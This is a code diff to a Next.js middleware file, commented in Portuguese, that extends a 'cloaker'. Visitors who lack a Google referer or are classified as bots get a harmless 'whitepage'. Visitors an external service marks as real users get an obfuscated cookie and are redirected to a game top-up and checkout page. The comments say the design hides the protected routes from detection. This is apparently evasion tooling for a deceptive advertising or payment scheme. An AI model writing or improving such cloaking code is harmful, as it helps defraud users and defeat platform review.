@@ -14,6 +14,43 @@ export async function middleware(request: NextRequest) {
   const pathname = request.nextUrl.pathname
   const referer = request.headers.get('referer') || ''
   
+  // Filtrar logs de assets estáticos para reduzir ruído
+  const isStaticAsset = pathname.startsWith('/images/') || 
+                        pathname.startsWith('/fonts/') || 
+                        pathname.startsWith('/_next/') ||
+                        pathname.includes('.png') ||
+                        pathname.includes('.jpg') ||
+                        pathname.includes('.webp') ||
+                        pathname.includes('.svg') ||
+                        pathname.includes('.woff')
+  
+  if (!isStaticAsset) {
+    console.log(`🌐 [Middleware] Pathname: ${pathname}`)
+  }
+  
+  // ============================================
+  // ✅ WHITELIST DE IPs - BYPASS TOTAL
+  // ============================================
+  // IPs nesta lista pulam TODAS as verificações (cloaker, cookies, etc)
+  const clientIp = request.headers.get('cf-connecting-ip') || 
+                   request.headers.get('x-forwarded-for')?.split(',')[0].trim() || 
+                   request.headers.get('x-real-ip') || 
+                   request.ip || 
+                   'unknown'
+  
+  const whitelistedIPs = [
+    '191.7.55.158',
+    // Adicione mais IPs aqui conforme necessário
+  ]
+  
+  // Whitelist: Apenas adiciona o IP à lista de permitidos
+  // Mas ainda passa pelo cloaker para validação
+  const isWhitelistedIP = whitelistedIPs.includes(clientIp)
+  
+  if (isWhitelistedIP) {
+    console.log(`✅ [Whitelist] IP na whitelist: ${clientIp} - Enviando para cloaker`)
+  }
+  
   // ============================================
   // 🌐 ROTAS PÚBLICAS - Acesso livre sem verificações
   // ============================================
@@ -24,15 +61,23 @@ export async function middleware(request: NextRequest) {
     // Nota: '/' NÃO está aqui pois precisa passar pelo cloaker
   ]
   
-  // Rota /sucesso ou /success requer parâmetros
-  const isSuccessRoute = pathname === '/sucesso' || pathname === '/success'
+  // Rota /sucesso ou /success requer parâmetros válidos
+  const isSuccessRoute = pathname === '/sucesso' || pathname === '/success' || pathname.startsWith('/sucesso/') || pathname.startsWith('/success/')
   if (isSuccessRoute) {
-    const hasParams = request.nextUrl.searchParams.toString().length > 0
-    if (hasParams) {
+    const hasTransactionId = request.nextUrl.searchParams.has('transactionId')
+    const hasAmount = request.nextUrl.searchParams.has('amount')
+    
+    // Permitir se tiver parâmetros válidos
+    if (hasTransactionId && hasAmount) {
       return NextResponse.next()
     }
-    // Se não tiver parâmetros, redireciona para /
-    return NextResponse.redirect(new URL('/', request.url))
+    
+    // Se não tiver parâmetros válidos, retornar 404
+    console.log(`🚫 [Middleware] Acesso negado a ${pathname} sem parâmetros válidos`)
+    return new NextResponse(null, {
+      status: 404,
+      statusText: 'Not Found'
+    })
   }
   
   // Liberar rotas públicas
@@ -45,11 +90,7 @@ export async function middleware(request: NextRequest) {
   // 🚫 BLOQUEIO DE IPs ESPECÍFICOS - PRIORIDADE MÁXIMA
   // ============================================
   
-  const clientIp = request.headers.get('cf-connecting-ip') || 
-                   request.headers.get('x-forwarded-for')?.split(',')[0].trim() || 
-                   request.headers.get('x-real-ip') || 
-                   request.ip || 
-                   'unknown'
+  // clientIp já foi definido acima na whitelist
   
   // Lista de ranges de IPs bloqueados permanentemente
   const blockedIPRanges = [
@@ -116,25 +157,36 @@ export async function middleware(request: NextRequest) {
   const hasValidCookie = request.cookies.get('_x9f2w8k5')?.value === 'true'
   
   if (hasValidCookie) {
+    console.log(`🍪 [Cookie] Cookie válido detectado - pathname: ${pathname}`)
+    console.log(`🍪 [Cookie] Valor do cookie: ${request.cookies.get('_x9f2w8k5')?.value}`)
+    
     // Se tem cookie e está na rota raiz (/), redirecionar para /recargajogo
     // EXCETO em localhost
     
     if ((pathname === '/' || pathname === '') && !isLocalhost) {
-      return NextResponse.redirect(new URL('/recargajogo', request.url))
+      console.log(`🔄 [Redirect] Redirecionando de ${pathname} para /recargajogo`)
+      const redirectUrl = new URL('/recargajogo', request.url)
+      console.log(`🔄 [Redirect] URL completa: ${redirectUrl.toString()}`)
+      return NextResponse.redirect(redirectUrl)
     }
     
+    console.log(`✅ [Cookie] Liberando acesso para: ${pathname}`)
+    console.log(`✅ [Cookie] Request URL: ${request.url}`)
     return NextResponse.next()
   }
   
   // ============================================
-  // 🔒 PROTEÇÃO ROTA /recargajogo - Apenas com cookie do cloaker
+  // 🔒 PROTEÇÃO ROTAS /recargajogo e /checkout - Apenas com cookie do cloaker
   // ============================================
   // Se chegou aqui, NÃO tem cookie válido
   // EXCETO em localhost (permitir acesso livre para desenvolvimento)
+  // 
+  // IMPORTANTE: NÃO retornar 404 aqui!
+  // Deixar o VerificationWrapper mostrar a whitepage (200 OK)
+  // Isso evita revelar que a rota existe
   
-  if ((pathname === '/recargajogo' || pathname === '/recargajogo/') && !isLocalhost) {
-    return NextResponse.redirect(new URL('/', request.url))
-  }
+  // Rotas protegidas são tratadas pelo VerificationWrapper
+  // Apenas continuar o fluxo normal
   
   // ============================================
   // 🎯 CLOAKER - Detecção de Bot vs Usuário Real
@@ -147,17 +199,21 @@ export async function middleware(request: NextRequest) {
     // Verificar referer ANTES de chamar o cloaker
     const referer = request.headers.get('referer') || ''
     
-    // Se NÃO tiver referer, mostrar whitepage (não chama cloaker)
-    if (!referer) {
-      return NextResponse.next()
+    // IPs whitelistados SEMPRE passam pelo cloaker (mesmo sem referer do Google)
+    if (!isWhitelistedIP) {
+      // Para IPs normais, verificar referer
+      // Se NÃO tiver referer, mostrar whitepage (não chama cloaker)
+      if (!referer) {
+        return NextResponse.next()
+      }
+      
+      // Se tiver referer mas NÃO for exatamente https://www.google.com/, mostrar whitepage
+      if (referer !== 'https://www.google.com/') {
+        return NextResponse.next()
+      }
     }
     
-    // Se tiver referer mas NÃO for exatamente https://www.google.com/, mostrar whitepage
-    if (referer !== 'https://www.google.com/') {
-      return NextResponse.next()
-    }
-    
-    // Se chegou aqui, referer é válido (https://www.google.com/) - chamar cloaker
+    // Se chegou aqui, referer é válido OU é IP whitelistado - chamar cloaker
     try {
       // Preparar dados do servidor para o cloaker
       const serverData = {
@@ -203,16 +259,25 @@ export async function middleware(request: NextRequest) {
           console.log('📥 [Cloaker] JSON parseado:', JSON.stringify(result, null, 2))
           console.log('🎯 [Cloaker] Tipo detectado:', result.type)
           
-          // Se for "black" (usuário real), setar cookie
+          // Se for "black" (usuário real), setar cookie e redirecionar
           if (result.type === 'black') {
+            const redirectUrl = new URL('/recargajogo', request.url)
             console.log('✅ [Cloaker] USUÁRIO REAL - setando cookie')
-            const response = NextResponse.next()
+            console.log('🔄 [Cloaker] Request URL original:', request.url)
+            console.log('🔄 [Cloaker] Redirect URL:', redirectUrl.toString())
+            console.log('🔄 [Cloaker] Pathname:', pathname)
+            
+            const response = NextResponse.redirect(redirectUrl)
             response.cookies.set('_x9f2w8k5', 'true', {
               httpOnly: false, // Permitir leitura no client-side
               secure: true,
               sameSite: 'lax',
               maxAge: 60 * 60 * 24 // 24 horas
             })
+            
+            console.log('🍪 [Cloaker] Cookie setado no response')
+            console.log('🔄 [Cloaker] Retornando redirect response')
+            
             return response
           } else {
             console.log('🤖 [Cloaker] BOT/WHITE detectado - tipo:', result.type)
